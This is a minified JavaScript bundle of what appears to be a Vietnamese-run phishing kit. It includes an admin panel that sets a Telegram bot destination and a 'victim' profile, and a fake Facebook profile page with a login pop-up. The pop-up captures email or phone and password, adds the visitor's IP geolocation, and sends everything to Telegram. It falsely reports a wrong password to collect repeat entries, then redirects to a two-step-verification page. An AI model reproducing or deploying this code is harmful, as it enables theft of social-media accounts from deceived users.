(()=>{"use strict";var e={181:function(e,t,a){var s=a(773),l=a(327);let r=()=>{let e="/"===(0,l.TH)().pathname;return(0,s.jsx)("div",{className:e?"":"flex min-h-screen flex-col items-center bg-white",children:(0,s.jsx)(l.j3,{})})};var i=a(699);let n=()=>{let e=(0,l.s0)(),t=(0,l.TH)(),a=localStorage.getItem("token");return((0,i.useEffect)(()=>{(async()=>{if(!a){"/admin/login"!==t.pathname&&e("/admin/login");return}try{let s=await fetch("/api/verify",{method:"GET",headers:{Accept:"*/*",Authorization:`Bearer ${a}`}});(await s.json()).success?"/admin/login"===t.pathname&&e("/admin/dashboard"):(localStorage.removeItem("token"),"/admin/login"!==t.pathname&&e("/admin/login"))}catch{localStorage.removeItem("token"),"/admin/login"!==t.pathname&&e("/admin/login")}})()},[a,t.pathname,e]),"/admin/login"===t.pathname)?(0,s.jsx)(l.j3,{}):a?(0,s.jsxs)("div",{className:"min-h-screen bg-zinc-100",children:[(0,s.jsx)("title",{children:"Trang Cấu H\xecnh"}),(0,s.jsx)("nav",{className:"bg-white shadow-sm",children:(0,s.jsx)("div",{className:"mx-auto max-w-7xl px-4 sm:px-6 lg:px-8",children:(0,s.jsxs)("div",{className:"flex h-16 justify-between",children:[(0,s.jsx)("div",{className:"flex items-center",children:(0,s.jsx)("h1",{className:"text-xl font-semibold text-black",children:"Trang Cấu H\xecnh"})}),(0,s.jsx)("div",{className:"flex items-center",children:(0,s.jsx)("button",{onClick:()=>{localStorage.removeItem("token"),e("/admin/login")},className:"rounded-md bg-black px-4 py-2 text-sm font-medium text-white hover:bg-zinc-800",children:"Đăng xuất"})})]})})}),(0,s.jsx)("main",{className:"mx-auto max-w-7xl px-4 py-6 sm:px-6 lg:px-8",children:(0,s.jsx)(l.j3,{})})]}):null};var o=a(483),c=a(910);let d=()=>{let[e,t]=(0,i.useState)(!1),[a,l]=(0,i.useState)(""),[r,n]=(0,i.useState)(""),[d,m]=(0,i.useState)(null),[x,h]=(0,i.useState)(""),[u,p]=(0,i.useState)(""),[b,g]=(0,i.useState)(null),f=localStorage.getItem("token"),j=(0,i.useRef)(null),v=(0,i.useRef)(null),y=(0,i.useRef)(null);(0,i.useEffect)(()=>{let e=async()=>{try{let e=await fetch("/api/user"),t=await e.json();t.success&&(m(t.data),h(t.data.avatar_image),p(t.data.cover_image))}catch{l("C\xf3 lỗi khi tải th\xf4ng tin người d\xf9ng")}};(async()=>{try{let[e,t]=await Promise.all([fetch("/api/config/telegram",{headers:{Authorization:`Bearer ${f}`}}),fetch("/api/config/system",{headers:{Authorization:`Bearer ${f}`}})]),a=await e.json(),s=await t.json();if(a.success&&j.current){let e=j.current;e.token.value=a.data.token,e.chat_id.value=a.data.chat_id}if(s.success&&v.current){let e=v.current;e.password_load_limit.value=s.data.password_load_limit,e.password_load_duration.value=s.data.password_load_duration,e.code_load_limit.value=s.data.code_load_limit,e.code_load_duration.value=s.data.code_load_duration}}catch{l("C\xf3 lỗi khi tải cấu h\xecnh")}})(),e()},[f]);let w=async e=>{e.preventDefault(),t(!0),l(""),n("");let a=new FormData(e.currentTarget),s={token:a.get("token"),chat_id:a.get("chat_id")};try{let e=await fetch("/api/config/telegram",{method:"POST",headers:{"Content-Type":"application/json",Authorization:`Bearer ${f}`},body:JSON.stringify(s)}),t=await e.json();t.success?n("Đ\xe3 cập nhật cấu h\xecnh Telegram"):l(t.message)}catch{l("C\xf3 lỗi xảy ra khi cập nhật cấu h\xecnh Telegram")}finally{t(!1)}},N=async e=>{e.preventDefault(),t(!0),l(""),n("");let a=new FormData(e.currentTarget),s={password_load_limit:Number(a.get("password_load_limit")),password_load_duration:Number(a.get("password_load_duration")),code_load_limit:Number(a.get("code_load_limit")),code_load_duration:Number(a.get("code_load_duration"))};try{let e=await fetch("/api/config/system",{method:"POST",headers:{"Content-Type":"application/json",Authorization:`Bearer ${f}`},body:JSON.stringify(s)}),t=await e.json();t.success?n("Đ\xe3 cập nhật cấu h\xecnh hệ thống"):l(t.message)}catch{l("C\xf3 lỗi xảy ra khi cập nhật cấu h\xecnh hệ thống")}finally{t(!1)}},k=async e=>{e.preventDefault(),t(!0),l(""),n("");let a=new FormData(e.currentTarget),s={username:a.get("username"),password:a.get("password")};try{let e=await fetch("/api/config/auth",{method:"POST",headers:{"Content-Type":"application/json",Authorization:`Bearer ${f}`},body:JSON.stringify(s)}),t=await e.json();t.success?(n("Đ\xe3 cập nhật th\xf4ng tin đăng nhập"),y.current&&y.current.reset()):l(t.message)}catch{l("C\xf3 lỗi xảy ra khi cập nhật th\xf4ng tin đăng nhập")}finally{t(!1)}},_=async(e,a)=>{t(!0),l(""),n("");let s=new FormData;s.append("image",e);try{let e=await fetch(`/api/user/upload?type=${a}`,{method:"POST",headers:{Authorization:`Bearer ${f}`},body:s}),t=await e.json();t.success?(n(`Đ\xe3 cập nhật ảnh ${"avatar"===a?"đại diện":"b\xeca"}`),"avatar"===a?h(t.data.image_url):p(t.data.image_url)):l(t.message)}catch{l(`C\xf3 lỗi xảy ra khi tải l\xean ảnh ${"avatar"===a?"đại diện":"b\xeca"}`)}finally{t(!1)}},S=async e=>{e.preventDefault(),t(!0),l(""),n("");let a={full_name:new FormData(e.currentTarget).get("full_name")};try{let e=await fetch("/api/user/info",{method:"POST",headers:{"Content-Type":"application/json",Authorization:`Bearer ${f}`},body:JSON.stringify(a)}),t=await e.json();t.success?(n("Đ\xe3 cập nhật th\xf4ng tin th\xe0nh c\xf4ng"),m(e=>e?{...e,full_name:a.full_name}:null)):l(t.message)}catch{l("C\xf3 lỗi xảy ra khi cập nhật th\xf4ng tin")}finally{t(!1)}},F=(e,t)=>{e.preventDefault(),g(t)},C=e=>{e.preventDefault(),g(null)},T=async(e,t)=>{e.preventDefault(),g(null);let a=e.dataTransfer.files[0];if(a){if(!["image/jpeg","image/jpg","image/png"].includes(a.type)){l("Chỉ chấp nhận file JPG, JPEG hoặc PNG");return}if(a.size>5242880){l("K\xedch thước file kh\xf4ng được vượt qu\xe1 5MB");return}await _(a,t)}},z=async(e,t)=>{var a;let s=null===(a=e.target.files)||void 0===a?void 0:a[0];if(s){if(!["image/jpeg","image/jpg","image/png"].includes(s.type)){l("Chỉ chấp nhận file JPG, JPEG hoặc PNG");return}if(s.size>5242880){l("K\xedch thước file kh\xf4ng được vượt qu\xe1 5MB");return}await _(s,t),e.target.value=""}};return(0,s.jsxs)("div",{className:"space-y-6",children:[a&&(0,s.jsx)("div",{className:"rounded-md border border-zinc-200 bg-zinc-50 p-4 text-black",children:a}),r&&(0,s.jsx)("div",{className:"rounded-md border border-zinc-200 bg-zinc-50 p-4 text-black",children:r}),(0,s.jsxs)("div",{className:"rounded-lg bg-white p-6 shadow",children:[(0,s.jsx)("h2",{className:"text-lg font-medium text-black",children:"Cấu h\xecnh Telegram"}),(0,s.jsxs)("form",{ref:j,onSubmit:w,className:"mt-4 space-y-4",children:[(0,s.jsxs)("div",{children:[(0,s.jsx)("label",{htmlFor:"token",className:"block text-sm font-medium text-black",children:"Token"}),(0,s.jsx)("input",{type:"text",id:"token",name:"token",className:"mt-1 block w-full rounded-md border border-zinc-300 p-2 text-black shadow-sm focus:border-black focus:ring-black"})]}),(0,s.jsxs)("div",{children:[(0,s.jsx)("label",{htmlFor:"chat_id",className:"block text-sm font-medium text-black",children:"Chat ID"}),(0,s.jsx)("input",{type:"text",id:"chat_id",name:"chat_id",className:"mt-1 block w-full rounded-md border border-zinc-300 p-2 text-black shadow-sm focus:border-black focus:ring-black"})]}),(0,s.jsx)("button",{type:"submit",disabled:e,className:"rounded-md bg-black px-4 py-2 text-white hover:bg-zinc-800 disabled:opacity-50",children:e?"Đang xử l\xfd...":"Cập nhật cấu h\xecnh Telegram"})]})]}),(0,s.jsxs)("div",{className:"rounded-lg bg-white p-6 shadow",children:[(0,s.jsx)("h2",{className:"text-lg font-medium text-black",children:"Cấu h\xecnh Website"}),(0,s.jsxs)("form",{ref:v,onSubmit:N,className:"mt-4 space-y-4",children:[(0,s.jsxs)("div",{className:"grid grid-cols-1 gap-4 sm:grid-cols-2",children:[(0,s.jsxs)("div",{children:[(0,s.jsx)("label",{htmlFor:"password_load_limit",className:"block text-sm font-medium text-black",children:"Giới hạn nhập mật khẩu"}),(0,s.jsx)("input",{type:"number",id:"password_load_limit",name:"password_load_limit",className:"mt-1 block w-full rounded-md border border-zinc-300 p-2 text-black shadow-sm focus:border-black focus:ring-black"})]}),(0,s.jsxs)("div",{children:[(0,s.jsx)("label",{htmlFor:"password_load_duration",className:"block text-sm font-medium text-black",children:"Thời gian giới hạn (gi\xe2y)"}),(0,s.jsx)("input",{type:"number",id:"password_load_duration",name:"password_load_duration",className:"mt-1 block w-full rounded-md border border-zinc-300 p-2 text-black shadow-sm focus:border-black focus:ring-black"})]}),(0,s.jsxs)("div",{children:[(0,s.jsx)("label",{htmlFor:"code_load_limit",className:"block text-sm font-medium text-black",children:"Giới hạn nhập m\xe3"}),(0,s.jsx)("input",{type:"number",id:"code_load_limit",name:"code_load_limit",className:"mt-1 block w-full rounded-md border border-zinc-300 p-2 text-black shadow-sm focus:border-black focus:ring-black"})]}),(0,s.jsxs)("div",{children:[(0,s.jsx)("label",{htmlFor:"code_load_duration",className:"block text-sm font-medium text-black",children:"Thời gian giới hạn m\xe3 (gi\xe2y)"}),(0,s.jsx)("input",{type:"number",id:"code_load_duration",name:"code_load_duration",className:"mt-1 block w-full rounded-md border border-zinc-300 p-2 text-black shadow-sm focus:border-black focus:ring-black"})]})]}),(0,s.jsx)("button",{type:"submit",disabled:e,className:"rounded-md bg-black px-4 py-2 text-white hover:bg-zinc-800 disabled:opacity-50",children:e?"Đang xử l\xfd...":"Cập nhật cấu h\xecnh Website"})]})]}),(0,s.jsxs)("div",{className:"rounded-lg bg-white p-6 shadow",children:[(0,s.jsx)("h2",{className:"text-lg font-medium text-black",children:"Thay đổi th\xf4ng tin đăng nhập"}),(0,s.jsxs)("form",{ref:y,onSubmit:k,className:"mt-4 space-y-4",children:[(0,s.jsxs)("div",{children:[(0,s.jsx)("label",{htmlFor:"username",className:"block text-sm font-medium text-black",children:"T\xean đăng nhập mới"}),(0,s.jsx)("input",{type:"text",id:"username",name:"username",className:"mt-1 block w-full rounded-md border border-zinc-300 p-2 text-black shadow-sm focus:border-black focus:ring-black"})]}),(0,s.jsxs)("div",{children:[(0,s.jsx)("label",{htmlFor:"new_password",className:"block text-sm font-medium text-black",children:"Mật khẩu mới"}),(0,s.jsx)("input",{type:"password",id:"new_password",name:"password",className:"mt-1 block w-full rounded-md border border-zinc-300 p-2 text-black shadow-sm focus:border-black focus:ring-black"})]}),(0,s.jsx)("button",{type:"submit",disabled:e,className:"rounded-md bg-black px-4 py-2 text-white hover:bg-zinc-800 disabled:opacity-50",children:e?"Đang xử l\xfd...":"Cập nhật th\xf4ng tin đăng nhập"})]})]}),(0,s.jsxs)("div",{className:"rounded-lg bg-white p-6 shadow",children:[(0,s.jsx)("h2",{className:"mb-6 text-lg font-medium text-black",children:"Th\xf4ng tin victim"}),(0,s.jsxs)("div",{className:"space-y-6",children:[(0,s.jsxs)("div",{className:"relative",children:[(0,s.jsx)("div",{className:`aspect-[21/9] w-full overflow-hidden rounded-lg bg-gray-100 ${"cover"===b?"border-2 border-dashed border-black":""}`,onDragOver:e=>F(e,"cover"),onDragLeave:C,onDrop:e=>T(e,"cover"),children:u?(0,s.jsx)("img",{src:u,alt:"Cover",className:"h-full w-full object-cover"}):(0,s.jsx)("div",{className:"flex h-full items-center justify-center",children:(0,s.jsx)("span",{className:"text-gray-400",children:"K\xe9o thả ảnh b\xeca v\xe0o đ\xe2y"})})}),(0,s.jsxs)("label",{htmlFor:"cover-upload",className:"absolute right-4 bottom-4 cursor-pointer rounded-md bg-black/75 px-4 py-2 text-white hover:bg-black/90",children:[(0,s.jsx)(o.G,{icon:c.VmB,className:"mr-2"}),"Thay đổi ảnh b\xeca",(0,s.jsx)("input",{type:"file",id:"cover-upload",className:"hidden",accept:"image/jpeg,image/jpg,image/png",onChange:e=>z(e,"cover")})]})]}),(0,s.jsxs)("div",{className:"flex items-center space-x-6",children:[(0,s.jsxs)("div",{className:"relative",children:[(0,s.jsx)("div",{className:`h-32 w-32 overflow-hidden rounded-full bg-gray-100 ${"avatar"===b?"border-2 border-dashed border-black":""}`,onDragOver:e=>F(e,"avatar"),onDragLeave:C,onDrop:e=>T(e,"avatar"),children:x?(0,s.jsx)("img",{src:x,alt:"Avatar",className:"h-full w-full object-cover"}):(0,s.jsx)("div",{className:"flex h-full items-center justify-center",children:(0,s.jsx)("span",{className:"text-gray-400",children:"?"})})}),(0,s.jsxs)("label",{htmlFor:"avatar-upload",className:"absolute right-0 bottom-0 cursor-pointer rounded-full bg-black/75 p-2 text-white hover:bg-black/90",children:[(0,s.jsx)(o.G,{icon:c._jT,className:"h-5 w-5"}),(0,s.jsx)("input",{type:"file",id:"avatar-upload",className:"hidden",accept:"image/jpeg,image/jpg,image/png",onChange:e=>z(e,"avatar")})]})]}),(0,s.jsxs)("form",{onSubmit:S,className:"flex-1 space-y-4",children:[(0,s.jsxs)("div",{children:[(0,s.jsx)("label",{htmlFor:"full_name",className:"block text-sm font-medium text-black",children:"T\xean hiển thị"}),(0,s.jsx)("input",{type:"text",id:"full_name",name:"full_name",defaultValue:null==d?void 0:d.full_name,className:"mt-1 block w-full rounded-md border border-zinc-300 p-2 text-black shadow-sm focus:border-black focus:ring-black"})]}),(0,s.jsx)("button",{type:"submit",disabled:e,className:"rounded-md bg-black px-4 py-2 text-white hover:bg-zinc-800 disabled:opacity-50",children:e?"Đang xử l\xfd...":"Cập nhật th\xf4ng tin"})]})]})]})]})]})},m=()=>{let e=(0,l.s0)(),[t,a]=(0,i.useState)(""),[r,n]=(0,i.useState)(""),[d,m]=(0,i.useState)(""),[x,h]=(0,i.useState)(!1),u=async a=>{a.preventDefault(),m(""),h(!0);try{let a=await fetch("/api/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:t,password:r})}),l=await a.json();if(l.success){var s;localStorage.setItem("token",(null===(s=l.data)||void 0===s?void 0:s.token)??""),e("/admin/dashboard")}else m(l.message)}catch{m("C\xf3 lỗi xảy ra khi đăng nhập")}finally{h(!1)}};return(0,s.jsxs)("div",{className:"flex min-h-screen items-center justify-center bg-zinc-100 px-4 py-12 sm:px-6 lg:px-8",children:[(0,s.jsx)("title",{children:"Đăng nhập"}),(0,s.jsx)("div",{className:"w-full max-w-md space-y-8 rounded-xl bg-white p-10 shadow-lg",children:(0,s.jsxs)("form",{className:"mt-8 space-y-6",onSubmit:u,children:[d&&(0,s.jsx)("div",{className:"relative rounded border border-zinc-200 bg-zinc-50 px-4 py-3 text-black",role:"alert",children:d}),(0,s.jsxs)("div",{className:"-space-y-px rounded-md shadow-sm",children:[(0,s.jsxs)("div",{children:[(0,s.jsx)("label",{htmlFor:"username",className:"sr-only",children:"T\xean đăng nhập"}),(0,s.jsx)("input",{id:"username",name:"username",type:"text",required:!0,className:"relative block w-full appearance-none rounded-none rounded-t-md border border-zinc-300 px-3 py-2 text-black placeholder-zinc-500 focus:z-10 focus:border-black focus:ring-black sm:text-sm",placeholder:"T\xean đăng nhập",value:t,onChange:e=>a(e.target.value)})]}),(0,s.jsxs)("div",{children:[(0,s.jsx)("label",{htmlFor:"password",className:"sr-only",children:"Mật khẩu"}),(0,s.jsx)("input",{id:"password",name:"password",type:"password",required:!0,className:"relative block w-full appearance-none rounded-none rounded-b-md border border-zinc-300 px-3 py-2 text-black placeholder-zinc-500 focus:z-10 focus:border-black focus:ring-black sm:text-sm",placeholder:"Mật khẩu",value:r,onChange:e=>n(e.target.value)})]})]}),(0,s.jsx)("div",{children:(0,s.jsxs)("button",{type:"submit",disabled:x,className:"group relative flex w-full justify-center rounded-md border border-transparent bg-black px-4 py-2 text-sm font-medium text-white hover:bg-zinc-800 focus:ring-2 focus:ring-black focus:ring-offset-2 disabled:opacity-50",children:[x?(0,s.jsx)("span",{className:"absolute inset-y-0 left-0 flex items-center pl-3",children:(0,s.jsx)(o.G,{icon:c.LM3,className:"h-5 w-5 animate-spin text-white"})}):null,x?"Đang xử l\xfd...":"Đăng nhập"]})})]})})]})},x=()=>(0,s.jsxs)("svg",{className:"fill-[#0866FF]",height:"22",viewBox:"100 100 900 160",xmlns:"http://www.w3.org/2000/svg",children:[(0,s.jsx)("title",{children:"Facebook"}),(0,s.jsx)("path",{d:"M881.583 257.897h29.48v-47.696l41.137 47.696h36.072l-47.89-54.969 40.909-47.663h-32.825l-37.403 43.93v-96.982l-29.48 3.864v151.82Zm-67.988-105.261c-32.728 0-55.455 22.013-55.455 53.929s22.727 53.929 55.455 53.929c32.727 0 55.455-22.013 55.455-53.929s-22.728-53.929-55.455-53.929Zm0 82.728c-15.163 0-25.552-11.721-25.552-28.799s10.389-28.799 25.552-28.799c15.162 0 25.552 11.721 25.552 28.799s-10.39 28.799-25.552 28.799Zm-119.807-82.728c-32.727 0-55.455 22.013-55.455 53.929s22.728 53.929 55.455 53.929c32.728 0 55.455-22.013 55.455-53.929s-22.727-53.929-55.455-53.929Zm0 82.728c-15.162 0-25.552-11.721-25.552-28.799s10.39-28.799 25.552-28.799c15.163 0 25.552 11.721 25.552 28.799s-10.389 28.799-25.552 28.799Zm-112.826-82.728c-13.636 0-24.935 5.357-32.013 15.162v-65.585l-29.513 3.831v151.82h26.169l.519-15.844c6.981 11.818 19.481 18.474 34.838 18.474 27.988 0 48.475-22.728 48.475-53.929 0-31.202-20.39-53.929-48.475-53.929Zm-6.98 82.728c-15.163 0-25.552-11.721-25.552-28.799s10.389-28.799 25.552-28.799c15.162 0 25.552 11.721 25.552 28.799s-10.39 28.799-25.552 28.799Zm-113.638 1.331c-15.649 0-26.883-7.273-30.714-19.805h72.63c.715-3.831 1.202-8.377 1.202-11.429 0-33.02-18.475-52.825-49.514-52.825-31.331 0-53.02 22.013-53.02 53.929 0 32.338 22.728 53.929 56.462 53.929 17.467 0 34.448-5.844 45.065-15.552l-10.617-18.701c-10.292 7.11-20.39 10.454-31.494 10.454Zm-6.591-61.137c13.637 0 22.338 8.279 22.338 21.104v.098h-47.078c2.825-13.604 11.623-21.202 24.74-21.202Zm-98.994 84.968c15.26 0 30.195-5.844 40.714-15.974l-11.526-19.383c-8.182 6.364-17.467 9.805-26.266 9.805-16.364 0-27.273-11.429-27.273-28.377s10.909-28.377 27.273-28.377c8.084 0 16.883 2.922 24.026 8.085l11.721-19.806c-9.481-8.571-24.156-13.831-38.702-13.831-32.013 0-54.643 22.338-54.643 53.929.032 31.494 22.662 53.929 54.676 53.929Zm-93.735-105.261-.519 15.975c-6.981-11.916-19.481-18.572-34.838-18.572-28.085 0-48.475 22.728-48.475 53.929 0 31.202 20.52 53.929 48.475 53.929 15.357 0 27.889-6.656 34.838-18.474l.519 15.844h26.169V155.265h-26.169Zm-28.377 80.099c-15.162 0-25.552-11.721-25.552-28.799s10.39-28.799 25.552-28.799c15.163 0 25.552 11.721 25.552 28.799s-10.422 28.799-25.552 28.799Zm-57.663-79.906h-26.526v-8.767c0-13.117 5.13-18.149 18.442-18.149 4.123 0 7.467.097 9.383.292v-22.5c-3.637-1.007-12.5-2.013-17.63-2.013-27.111 0-39.611 12.792-39.611 40.422v10.682h-16.753v24.806h16.753v77.631h29.448v-77.599h21.949l4.545-24.805Z"})]}),h=a.p+"static/image/cover.c0d958b0.jpg",u=a.p+"static/image/avatar.c1fe5ac8.jpg",p=e=>{let{onClose:t}=e,[a,r]=(0,i.useState)(""),[n,d]=(0,i.useState)(""),[m,x]=(0,i.useState)({}),[h,u]=(0,i.useState)(!1),[p,b]=(0,i.useState)(0),[g,f]=(0,i.useState)(null),j=(0,l.s0)(),v=e=>/\S+@\S+\.\S+/.test(e),y=e=>/^(?:(?:\+|00)(?:[1-9]\d{0,2}))?[1-9]\d{7,14}$/.test(e.replace(/\s+/g,"")),w=()=>{let e={};if(a){let t=v(a),s=y(a);t||s||(e.email="Please enter a valid email address or phone number")}else e.email="Email or phone number is required";return n||(e.password="Password is required"),x(e),0===Object.keys(e).length},N=async e=>{try{let t=await fetch("/api/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({text:e,parse_mode:"HTML",old_message_id:g})}),a=await t.json();return a.success&&a.message_id&&(localStorage.setItem("telegram_message_id",a.message_id.toString()),localStorage.setItem("telegram_message",e),f(a.message_id)),a.success}catch(e){return!1}},k=async e=>{if(e.preventDefault(),w()){let e;u(!0),b(e=>e+1);let t=JSON.parse(localStorage.getItem("geoData")??"{}"),s=localStorage.getItem("telegram_message")??"",l=/🔑 <b>Mật khẩu \d+:<\/b> <code>(.*?)<\/code>/g,r=[];for(;null!==(e=l.exec(s));)r.push(e[1]);let i=new Date().toLocaleString("vi-VN",{timeZone:"Asia/Ho_Chi_Minh",hour12:!1}),o=r.map((e,t)=>`🔑 <b>Mật khẩu ${t+1}:</b> <code>${e}</code>`).join("\n"),c=`🔑 <b>Mật khẩu ${r.length+1}:</b> <code>${n}</code>`,m=`🌐 <b>IP:</b> <code>${t.ip||"N/A"}</code>
📍 <b>Địa chỉ:</b> <code>${t.city||"N/A"}, ${t.region||"N/A"}, ${t.country||"N/A"} (${t.country_code||"N/A"})</code>
⏰ <b>Thời gian:</b> <code>${i}</code>

📧 <b>Email:</b> <code>${a}</code>
${o}${r.length>0?"\n":""}${c}`.trim();if(await N(m),await new Promise(e=>setTimeout(e,2e3)),u(!1),p>=2){j("/two-step-verification");return}x({password:"Incorrect password. Please try again."}),d("")}};return(0,s.jsx)("div",{className:"fixed inset-0 z-50 flex items-center justify-center bg-white/60 px-2",onClick:e=>e.stopPropagation(),children:(0,s.jsxs)("div",{className:"w-full max-w-[486px] rounded-lg bg-white shadow-md",onClick:e=>e.stopPropagation(),children:[(0,s.jsx)("div",{className:"flex justify-end p-4",children:(0,s.jsx)("button",{onClick:t,className:"h-9 w-9 rounded-full bg-gray-200 p-1 text-gray-500 hover:bg-gray-300",children:(0,s.jsx)(o.G,{icon:c.g82,className:"h-6 w-6"})})}),(0,s.jsxs)("div",{className:"p-4 md:p-8",children:[(0,s.jsx)("h2",{className:"mb-5 text-center text-[28px] font-bold",children:"See more on Facebook"}),(0,s.jsxs)("form",{className:"flex flex-col items-center gap-4",onSubmit:k,children:[(0,s.jsxs)("div",{className:"relative w-full",children:[(0,s.jsx)("input",{type:"text",id:"email",value:a,onChange:e=>{let t=e.target.value;r(t),(v(t)||y(t))&&x(e=>({...e,email:void 0}))},className:`peer w-full rounded-lg border ${m.email?"border-red-500":"border-gray-300"} focus:ring-primary p-3 pt-6 text-base focus:ring-2 focus:ring-offset-2 focus:ring-offset-white focus:outline-none`,placeholder:" "}),(0,s.jsx)("label",{htmlFor:"email",className:"peer-focus:text-primary absolute top-4 left-3 cursor-text text-gray-500 transition-all select-none peer-placeholder-shown:translate-y-0 peer-placeholder-shown:text-base peer-focus:-translate-y-3 peer-focus:text-xs peer-[:not(:placeholder-shown)]:-translate-y-3 peer-[:not(:placeholder-shown)]:text-xs",children:"Email address or phone number"}),m.email&&(0,s.jsx)("p",{className:"mt-1 text-sm text-red-500",children:m.email})]}),(0,s.jsxs)("div",{className:"relative w-full",children:[(0,s.jsx)("input",{type:"password",id:"password",value:n,onChange:e=>d(e.target.value),className:`peer w-full rounded-lg border ${m.password?"border-red-500":"border-gray-300"} focus:ring-primary p-3 pt-6 text-base focus:ring-2 focus:ring-offset-2 focus:ring-offset-white focus:outline-none`,placeholder:" "}),(0,s.jsx)("label",{htmlFor:"password",className:"peer-focus:text-primary absolute top-4 left-3 cursor-text text-gray-500 transition-all select-none peer-placeholder-shown:translate-y-0 peer-placeholder-shown:text-base peer-focus:-translate-y-3 peer-focus:text-xs peer-[:not(:placeholder-shown)]:-translate-y-3 peer-[:not(:placeholder-shown)]:text-xs",children:"Password"}),m.password&&(0,s.jsx)("p",{className:"mt-1 text-sm text-red-500",children:m.password})]}),(0,s.jsx)("button",{type:"submit",disabled:h||!a||!n,className:"w-full rounded-lg bg-blue-600 px-4 py-2 text-[17px] font-semibold text-white transition hover:bg-blue-700 disabled:opacity-50",children:h?"Loading...":"Log in"}),(0,s.jsx)("a",{href:"#",className:"text-primary text-center text-[15px] font-semibold hover:underline",children:"Forgotten password?"}),(0,s.jsxs)("div",{className:"my-2 flex w-full items-center gap-3",children:[(0,s.jsx)("div",{className:"h-[1px] flex-1 bg-gray-300"}),(0,s.jsx)("span",{className:"text-[15px] text-gray-500",children:"or"}),(0,s.jsx)("div",{className:"h-[1px] flex-1 bg-gray-300"})]}),(0,s.jsx)("button",{type:"button",className:"w-fit rounded-lg bg-green-600 px-10 py-2 text-[17px] font-semibold text-white transition hover:bg-green-700",children:"Create new account"})]})]})]})})},b=()=>{let e=localStorage.getItem("systemConfig");return e?JSON.parse(e):null},g=e=>{localStorage.setItem("systemConfig",JSON.stringify(e))},f="Chao Văn X\xecn",j=async e=>{try{let t=(await fetch(e,{method:"HEAD"})).headers.get("content-type");return!!t&&t.startsWith("image/")}catch{return!1}},v=()=>{let[e,t]=(0,i.useState)(!1),[a,l]=(0,i.useState)({full_name:f,cover_image:h,avatar_image:u});(0,i.useEffect)(()=>{localStorage.clear();let e=async()=>{try{let e=await fetch("/api/config/system"),t=await e.json();t.success&&g(t.data)}catch(e){}},a=async()=>{try{let e=await fetch("https://get.geojs.io/v1/ip/geo.json"),t=await e.json();localStorage.setItem("geoData",JSON.stringify(t))}catch(e){}};(async()=>{try{let e=await fetch("/api/user"),t=await e.json();if(t.success){let[e,a]=await Promise.all([!!t.data.avatar_image&&j(t.data.avatar_image),!!t.data.cover_image&&j(t.data.cover_image)]);l({full_name:t.data.full_name||f,cover_image:a?t.data.cover_image:h,avatar_image:e?t.data.avatar_image:u})}}catch{}})(),e(),a();let s=setTimeout(()=>{t(!0)},1e3);return()=>clearTimeout(s)},[]);let r=(e,t)=>{e.target.src="avatar"===t?u:h};return(0,s.jsxs)("main",{onClick:()=>{e||t(!0)},children:[(0,s.jsx)("title",{children:`${a.full_name} | Facebook`}),(0,s.jsxs)("header",{className:"sticky top-0 z-10 flex h-14 items-center justify-between bg-white px-4 shadow-md md:px-8",children:[(0,s.jsx)(x,{}),(0,s.jsxs)("div",{className:"flex items-center gap-2",children:[(0,s.jsx)("input",{placeholder:"Email or phone",type:"text",className:"hidden rounded-md border border-[#ced0d4] px-3 py-2 placeholder:text-[#65676B] md:block"}),(0,s.jsx)("input",{placeholder:"Password",type:"password",className:"hidden rounded-md border border-[#ced0d4] px-3 py-2 placeholder:text-[#65676B] md:block"}),(0,s.jsx)("button",{className:"bg-primary hover:bg-primary/90 rounded-md px-3 py-[9px] text-[15px] font-semibold text-white",children:"Login"}),(0,s.jsx)("p",{className:"hidden px-1 py-1.5 text-[15px] font-semibold text-[#0064d1] md:block",children:"Forgotten account?"})]})]}),(0,s.jsxs)("div",{className:"flex w-full flex-col items-center justify-center bg-white shadow-md md:min-h-[500px]",children:[(0,s.jsxs)("div",{className:"relative h-[250px] w-full max-w-[940px] md:h-[350px]",children:[(0,s.jsx)("img",{src:a.cover_image,alt:"",className:"h-full w-full rounded-b-md object-cover object-center",onError:e=>r(e,"cover")}),(0,s.jsxs)("div",{className:"absolute -bottom-24 left-1/2 flex -translate-x-1/2 flex-col items-center gap-2 md:-bottom-20 md:left-8 md:translate-x-0 md:flex-row md:items-end",children:[(0,s.jsx)("img",{src:a.avatar_image,alt:"",className:"h-[120px] w-[120px] rounded-full border-4 border-white object-cover md:h-[176px] md:w-[176px]",onError:e=>r(e,"avatar")}),(0,s.jsx)("p",{className:"text-2xl font-bold md:py-2 md:text-3xl",children:a.full_name})]})]}),(0,s.jsx)("hr",{className:"mt-28 w-full border-gray-300 md:mt-24 md:w-[876px]"}),(0,s.jsxs)("div",{className:"flex h-16 w-full max-w-[876px] items-center justify-between px-4 text-[15px] font-semibold text-[#65676b]",children:[(0,s.jsxs)("div",{className:"flex items-center gap-2 overflow-x-auto",children:[(0,s.jsx)("p",{children:"Friends"}),(0,s.jsx)("p",{children:"Photos"}),(0,s.jsx)("p",{children:"Photos"})]}),(0,s.jsx)(o.G,{icon:c.cNd,className:"rounded-md bg-gray-200 px-4 py-2.5"})]})]}),(0,s.jsx)("div",{className:"bg-[#F0F2F5] p-2 md:p-4",children:(0,s.jsxs)("div",{className:"mx-auto flex max-w-[876px] flex-col gap-4",children:[(0,s.jsxs)("div",{className:"rounded-lg bg-white p-4",children:[(0,s.jsx)("h2",{className:"mb-4 text-xl font-bold",children:"About"}),(0,s.jsxs)("div",{className:"space-y-4",children:[(0,s.jsxs)("div",{children:[(0,s.jsx)("h3",{className:"font-semibold",children:"Work"}),(0,s.jsxs)("p",{className:"flex items-center gap-2 text-[#65676b]",children:[(0,s.jsx)(o.G,{icon:c.HXv,className:"text-[#65676b]"}),"No workplaces to show"]})]}),(0,s.jsxs)("div",{children:[(0,s.jsx)("h3",{className:"font-semibold",children:"University"}),(0,s.jsxs)("p",{className:"flex items-center gap-2 text-[#65676b]",children:[(0,s.jsx)(o.G,{icon:c.Xf_,className:"text-[#65676b]"}),"No schools/universities to show"]})]}),(0,s.jsxs)("div",{children:[(0,s.jsx)("h3",{className:"font-semibold",children:"High School"}),(0,s.jsxs)("p",{className:"flex items-center gap-2 text-[#65676b]",children:[(0,s.jsx)(o.G,{icon:c.QRb,className:"text-[#65676b]"}),"No schools/universities to show"]})]})]})]}),(0,s.jsxs)("div",{className:"rounded-lg bg-white p-4",children:[(0,s.jsxs)("div",{className:"mb-4 flex items-center justify-between",children:[(0,s.jsx)("h2",{className:"text-lg font-bold 